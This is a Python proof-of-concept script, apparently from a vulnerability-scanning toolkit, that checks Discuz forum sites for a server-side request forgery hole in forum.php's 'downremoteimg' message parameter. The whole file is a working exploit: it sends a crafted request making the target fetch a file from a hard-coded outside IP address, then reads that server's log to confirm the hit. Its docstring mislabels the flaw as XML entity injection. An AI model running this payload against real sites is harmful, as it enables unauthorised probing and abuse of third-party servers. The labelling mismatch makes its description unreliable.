#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: discuz论坛forum.php参数message SSRF漏洞
referer: unknown
author: Lucifer
description: trs infogate插件 blind XML实体注入。
'''
import sys
import time
import hashlib
import datetime
import requests
import warnings
from termcolor import cprint

class discuz_forum_message_ssrf_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        }
        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://45.76.158.91:6868/"+md5_str+".jpg[/img]&formhash=09cec465"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            eye_url = "http://45.76.158.91/web.log"
            time.sleep(6)
            reqr = requests.get(eye_url, timeout=10, verify=False)
            if md5_str in reqr.text:
                cprint("[+]存在discuz论坛forum.php参数message SSRF漏洞...(中危)\tpayload: "+vulnurl, "yellow")
                return True,vulnurl,"Discuz论坛forum.php参数message SSRF漏洞",payload,req.text
            else:
                cprint("[-]不存在discuz_forum_message_ssrf漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = discuz_forum_message_ssrf_BaseVerify(sys.argv[1])
    testVuln.run()
